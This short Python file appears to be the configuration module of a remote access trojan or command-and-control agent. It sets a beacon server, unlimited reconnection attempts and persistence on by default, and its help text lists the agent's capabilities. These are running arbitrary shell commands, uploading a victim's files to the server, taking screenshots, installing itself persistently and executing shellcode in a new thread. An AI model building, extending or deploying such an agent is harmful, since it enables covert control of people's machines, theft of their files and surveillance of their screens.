SERVER = "http://localhost:5000"
HELLO_INTERVAL = 60
IDLE_TIME = 60
MAX_FAILED_CONNECTIONS = -1
PERSIST = True
TLS_VERIFY = True
HELP = """
<any shell command>
Executes the command in a shell and return its output.

upload <local_file>
Uploads <local_file> to server.

download <url> <destination>
Downloads a file through HTTP(S).

zip <archive_name> <folder>
Creates a zip archive of the folder.

screenshot
Takes a screenshot.

persist
Installs the agent.

clean
Uninstalls the agent.

execshellcode <shellcode>
Executes shellcode in a new thread.

exit
Kills the agent.
"""
